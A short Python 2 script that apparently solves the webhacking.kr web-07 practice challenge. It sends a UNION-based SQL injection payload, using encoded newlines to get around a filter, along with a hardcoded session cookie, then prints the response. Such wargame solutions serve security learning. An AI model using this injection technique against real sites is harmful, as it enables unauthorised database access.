#-*- coding: utf-8 -*-
import urllib2
import CookieManager

CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")

injectionQuery = "1)%0aunion%0aselect%0a(1+1"
challengeUrl = "http://webhacking.kr/challenge/web/web-07/index.php?val=" + injectionQuery
httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
